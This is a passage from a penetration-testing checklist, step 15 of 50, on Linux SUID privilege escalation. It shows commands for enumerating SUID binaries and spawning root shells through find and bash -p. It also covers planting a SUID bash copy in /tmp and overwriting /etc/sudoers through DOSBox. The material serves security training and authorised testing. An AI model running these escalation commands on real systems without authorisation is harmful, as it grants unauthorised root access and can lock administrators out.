# Linux - SUID Check

**Step 15 of 50 · Linux**

*Find programs that run with the file owner's privileges and check them for an escape.*

## Run this

```bash
find / -perm -4000 2>/dev/null
```

## Example output

```

/usr/bin/passwd
/usr/bin/find
/opt/custom-helper
...
```
## What did you get?

- [ ] A known exploitable SUID binary is found → **Check GTFOBins and run the matching path**
- [ ] `/usr/bin/find` is SUID → **`/usr/bin/find . -exec /bin/bash -p \; -quit`**
- [ ] `/bin/bash` is SUID → **`/bin/bash -p`**
- [ ] A SUID binary was created by a previous step (e.g. `cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash`) → **`/tmp/rootbash -p`**
- [ ] `dosbox` is SUID → **Mount `/etc` as a DOSBox drive and overwrite `sudoers`: `dosbox -c 'mount c /etc' -c 'echo username ALL=(ALL) NOPASSWD: ALL >> c:\sudoers' -c exit`**
- [ ] A custom SUID binary is found → **Inspect it with `strings` and `ltrace`, then go to Step 10 · [[Linux - Exploit Search]]**
- [ ] No useful SUID binary is found → **Go to Step 16 · [[Linux - Cron Check]]**

## Notes

SUID means the program runs with the owner's permissions, often root. GTFOBins lists confirmed escape paths for standard binaries.

The `-p` flag on bash preserves the effective UID — without it, bash drops the SUID privilege.

## Gotcha

> [!warning] 💡
> Do not assume every SUID result is exploitable. Check ownership, version, and how it is invoked.

> [!warning] 💡
> If you write to `/etc/sudoers` via DOSBox or any other method, always verify the file is still valid after the edit — a syntax error in sudoers locks out all sudo access on the box. Run `visudo -c` or check `sudo -l` immediately.
